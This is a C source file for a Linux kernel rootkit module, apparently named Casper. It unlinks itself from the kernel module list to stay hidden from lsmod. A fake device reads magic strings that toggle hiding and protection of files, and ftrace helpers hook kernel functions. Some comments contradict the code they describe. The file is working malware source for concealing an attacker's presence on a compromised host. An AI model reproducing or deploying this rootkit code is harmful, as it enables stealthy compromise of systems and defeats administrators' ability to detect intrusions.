
#include "hooked.h"

MODULE_LICENSE("GPL");

void module_hide(void)
{

	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}



int fake_open(struct inode * inode, struct file * filp)
{
    return 0;
}


int fake_release(struct inode * inode, struct file * filp)
{
    return 0;
}


ssize_t fake_read (struct file *filp, char __user * buf, size_t count,
                                loff_t * offset)
{
    return 0;
}


ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
                                loff_t * offset)
{
	memset(message,0,127);

	if(copy_from_user(message,buf,127)!=0)
		return EFAULT;

/* if detect the secret string in device input, show module at lsmod. */
    	if(strstr(message,"CASPER_HIDE")!=NULL)
		{
			list_add(&THIS_MODULE->list, module_previous);
			module_hidden = 0;
     	}

/*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
    	if(strstr(message,"CASPER_UNHIDE")!=NULL)
		{
			module_hide();
     	}

     	/*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
    	if(strstr(message,"CASPER_HIDE_UNHIDE_FS")!=NULL)
	{
            fs_hidden = fs_hidden?0:1;
     	}

     	/*	If detect hocuspocus string in fake device IO turn module invisible to lsmod  */
    	if(strstr(message,"CASPER_PROTECT_UNPROTECT_FS")!=NULL)
	{
            fs_protect = fs_protect?0:1;
     	}


    return count;
}



_Bool check_fs_blocklist(char *input)
{
	int total_list = 2,i = 0;
	const char *list[] = {
CASPER_PROTECT_LIST
	};

	while(i!=total_list)
	{
		if(strstr(input, list[i]) != NULL)
			return 1;
		i++;
	}

	return 0;
}

_Bool check_fs_hidelist(char *input)
{
	int total_list = 2,i = 0;
	const char *list[] = {
CASPER_HIDE_LIST
	};
	if(fs_hidden==0)
	    return 0;

	while(i!=total_list)
	{
		if(strstr(input, list[i]) != NULL)
			return 1;
		i++;
	}

	return 0;
}

int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}


void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}


int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0; i < count; i++) {
		err = fh_install_hook(&hooks[i]);
		if (err)
			goto error;
	}

	return 0;

error:
	while (i != 0) {
		fh_remove_hook(&hooks[--i]);
	}

	return err;
}


void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0; i < count; i++)
		fh_remove_hook(&hooks[i]);
}

